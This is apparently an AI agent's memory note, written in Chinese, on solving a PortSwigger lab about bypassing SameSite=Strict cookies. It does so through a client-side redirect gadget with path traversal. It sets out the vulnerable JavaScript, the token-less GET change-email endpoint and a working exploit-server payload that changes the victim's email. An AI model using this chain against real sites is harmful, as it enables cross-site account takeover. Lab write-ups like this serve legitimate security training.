---
metadata:
  node_type: memory
name: "PRS arm A lab-samesite-strict-bypass-via-client-side-redirect"
description: "arm A 基线:lab-samesite-strict-bypass-via-client-side-redirect 冷实例一次通过 - 评论确认页 redirectOnConfirmation('/post') 拼 postId 无过滤,路径穿越 /post/../my-account/change-email 经同站客户端跳转带 Strict cookie,GET 改 victim 邮箱,banner solved"
last_updated: 2026-10-09T07:49:00+08:00
created: 2026-10-09T07:49:00+08:00
---

题:lab-samesite-strict-bypass-via-client-side-redirect(arm A)。实例 https://0a3200670428223983dd00210080003d.web-security-academy.net/ ,exploit server https://exploit-0acc0047049422fe8271ff5e01d400b4.exploit-server.net 。reused:false,一次通过。

链路(4 步)
1. 侦察:首页/登录面正常;确认页 /post/comment/confirmation?postId=N 自身不带跳转,而是加载 /resources/js/commentConfirmationRedirect.js 并调 redirectOnConfirmation('/post')。
2. gadget:该 JS 为
   redirectOnConfirmation = (blogPath) => { setTimeout(() => { const url = new URL(window.location); const postId = url.searchParams.get("postId"); window.location = blogPath + '/' + postId; }, 3000); }
   ⇒ 目标路径 = /post/ + postId(未过滤),postId 可控 ⇒ 客户端跳转里的路径穿越。
3. 端点:登录页无 csrf 字段,POST /login(wiener:peter) 即登录;/my-account 的改邮箱表单 action=/my-account/change-email、字段 email+hidden submit=1、无 csrf token。实测 GET /my-account/change-email?email=...&submit=1 直接改邮箱(302 → /my-account),即端点吃 GET 查询串且不校验 token。
4. 载荷与投递:exploit server 存 body =
   <script>document.location="https://<lab>/post/comment/confirmation?postId=..%2Fmy-account%2Fchange-email%3Femail=hacked%40evil-user.net%26submit=1";</script>
   STORE 后 POST formAction=DELIVER_TO_VICTIM(--follow 跟 302)。

机制要点
- Strict cookie 不在跨站顶层导航上发送,但只需首跳(确认页)无需鉴权;确认页在 lab 站点内再发起的"同站"客户端跳转就带上 Strict cookie,从而把无 token 的改邮箱请求变成已鉴权请求。
- 路径穿越:/post/../my-account/change-email?... 由浏览器 URL 解析归一为 /my-account/change-email?...。
- postId 值里内层 ? 与 & 必须编码成 %3F/%26,外层 searchParams.get 解码一次后再拼接。

判据:access log 出现 victim 行 10.0.4.34 "GET /exploit/ HTTP/1.1" 200 (Victim) Chrome/154;exploit server 与实例横幅均 is-solved,"Congratulations, you solved the lab!"。
坑:range_launch 信封 exploit_server=null,但实例横幅里有 Go to exploit server 链接(勿信 null,回读首页即可拿到地址);http_session 会剥 script 块(script_blocks_stripped),要看跳转脚本须用 http_dump/raw_http 落原始 body。

